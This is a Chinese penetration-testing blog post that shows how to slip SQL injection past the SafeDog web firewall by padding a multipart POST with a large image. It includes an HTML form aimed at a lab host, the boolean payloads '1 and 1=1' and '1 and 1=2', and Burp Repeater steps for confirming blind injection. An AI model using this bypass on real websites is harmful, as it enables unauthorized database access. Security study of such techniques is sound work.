当我们在渗透一个网站的时候，很多时候，会遇到下面这种情况。网站装有WAF，把我们的[SQL注入](https://so.csdn.net/so/search?q=SQL%E6%B3%A8%E5%85%A5&spm=1001.2101.3001.7020)语句给拦截了。

![](https://img-blog.csdnimg.cn/20181207153651259.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

这就是网站的安全狗

![](https://img-blog.csdnimg.cn/2018120715584270.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

此时，我们的渗透会陷入僵局。到底应该如何才能让我们的语句绕过安全狗的检查呢？

我们可以自己写一个页面，该页面可以向网站提交数据，我们在提交数据的同时还提交一张图片，由于图片的数据过大，超过了安全狗的正则匹配的字符，我们就可以绕过了

```
<!DOCTYPE html>      
<html>      
<head lang="en">      
    <meta charset="UTF-8">      
    <title></title>      
</head>      
<body>      
   <form action="http://192.168.10.14/cat.php?id=1" method="POST" enctype="multipart/form-data">      
       File: <input type="file" name="file"/> <br/>      1
       ID: <input type="text" name="id" value="1 and 1=1" style="width=400px;"/> <br/>      1
       <input type="submit" value="提交"/>      1
   </form>      1
</body>      1
</html>
```


我们随便选择本地一张照片和我们的SQL语句一起提交

![](https://img-blog.csdnimg.cn/20181207161459521.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后用BrupSuite抓包，送到Repeater模块，拉到请求数据的最后，点击发送。我们可以看到，当发送的数据是 1 and 1=1的时候，回复的字节数是 2649个字节

![](https://img-blog.csdnimg.cn/20181207162154590.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

 然后我们修改为  1  and  1=2 ,字节数是2130个字节，很明显，这里存在盲注。而且我们已经绕过安全狗的检测了。![](https://img-blog.csdnimg.cn/2018120716252075.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

 如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！[知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具](https://wx.zsxq.com/dweb2/index/group/88514121251242 "知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具")

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)